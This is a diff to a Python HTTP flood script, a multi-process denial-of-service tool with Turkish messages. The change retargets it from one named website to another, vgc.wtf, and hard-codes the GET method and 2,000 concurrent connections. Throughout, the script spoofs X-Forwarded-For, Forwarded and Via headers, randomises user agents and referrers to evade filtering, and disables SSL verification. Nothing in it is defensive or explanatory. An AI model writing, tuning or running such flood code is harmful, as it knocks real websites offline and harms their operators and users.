@@ -1,11 +1,11 @@
-# language: Python 3.10+, file: flood_pro.py
-# deps: pip install aiohttp uvloop fake-useragent
+# language: Python 3.10+, file: flood.py
+# Linux: pip install aiohttp uvloop fake-useragent
+# çalıştır: python flood.py
 
 import asyncio
 import aiohttp
 import random
 import time
-import sys
 import os
 from fake_useragent import UserAgent
 from multiprocessing import Process, cpu_count
@@ -16,14 +16,14 @@ try:
 except ImportError:
     pass
 
-# ================== AYARLAR ==================
-TARGET = "https://topluyo.com"
+# ================== SABİT ==================
+TARGET = "https://vgc.wtf"
 TOTAL_REQUESTS = 100000
-CONCURRENT = 1800
-METHOD = "GET"                  # GET / POST / HEAD
-TIMEOUT = 7
-PROCESSES = max(2, cpu_count() // 2)   # çoklu process
-# =============================================
+CONCURRENT = 2000
+METHOD = "GET"
+TIMEOUT = 6
+PROCESSES = max(2, cpu_count() // 2)
+# ===========================================
 
 ua = UserAgent()
 
@@ -52,6 +52,7 @@ REFERRERS = [
     "https://t.co/",
     "https://www.youtube.com/",
     "https://www.reddit.com/",
+    "https://vgc.wtf/",
     "",
 ]
 
@@ -66,7 +67,7 @@ def random_headers():
         "Accept-Language": random.choice(LANGUAGES),
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
-        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "private"]),
+        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
         "Upgrade-Insecure-Requests": "1",
         "Referer": random.choice(REFERRERS),
         "X-Forwarded-For": ip,
@@ -79,25 +80,17 @@ def random_headers():
         "Forwarded": f"for={ip};proto=https",
         "Via": f"1.1 {random_ip()}",
         "DNT": random.choice(["1", "0"]),
-        "Sec-Fetch-Dest": random.choice(["document", "empty", "image"]),
-        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
-        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
+        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
+        "Sec-Fetch-Mode": random.choice(["navigate", "cors"]),
+        "Sec-Fetch-Site": random.choice(["none", "cross-site"]),
     }
 
 async def worker(session, sem, stats):
     async with sem:
         headers = random_headers()
         try:
-            if METHOD == "POST":
-                data = os.urandom(random.randint(80, 600))
-                async with session.post(TARGET, headers=headers, data=data, timeout=TIMEOUT) as resp:
-                    await resp.read()
-            elif METHOD == "HEAD":
-                async with session.head(TARGET, headers=headers, timeout=TIMEOUT) as resp:
-                    await resp.read()
-            else:
-                async with session.get(TARGET, headers=headers, timeout=TIMEOUT) as resp:
-                    await resp.read()
+            async with session.get(TARGET, headers=headers, timeout=TIMEOUT) as resp:
+                await resp.read()
             stats["ok"] += 1
         except:
             stats["fail"] += 1
@@ -107,11 +100,11 @@ async def run_flood(worker_id, req_count):
     connector = aiohttp.TCPConnector(
         limit=CONCURRENT,
         limit_per_host=CONCURRENT,
-        ttl_dns_cache=300,
+        ttl_dns_cache=200,
         force_close=False,
         enable_cleanup_closed=True,
         ssl=False,
-        keepalive_timeout=30,
+        keepalive_timeout=25,
     )
     timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=3)
     sem = asyncio.Semaphore(CONCURRENT)
@@ -137,8 +130,7 @@ def main():
     print(f"[*] Total req    : {TOTAL_REQUESTS}")
     print(f"[*] Concurrent   : {CONCURRENT}")
     print(f"[*] Processes    : {PROCESSES}")
-    print(f"[*] Method       : {METHOD}")
-    print("[*] Starting multi-process flood...\n")
+    print("[*] Başlıyor...\n")
 
     per_process = TOTAL_REQUESTS // PROCESSES
     extra = TOTAL_REQUESTS % PROCESSES
@@ -153,16 +145,7 @@ def main():
     for p in procs:
         p.join()
 
-    print("\n[+] Tüm processler tamamlandı.")
+    print("\n[+] Bitti.")
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        TARGET = sys.argv[1]
-    if len(sys.argv) > 2:
-        TOTAL_REQUESTS = int(sys.argv[2])
-    if len(sys.argv) > 3:
-        CONCURRENT = int(sys.argv[3])
-    if len(sys.argv) > 4:
-        PROCESSES = int(sys.argv[4])
-
     main()
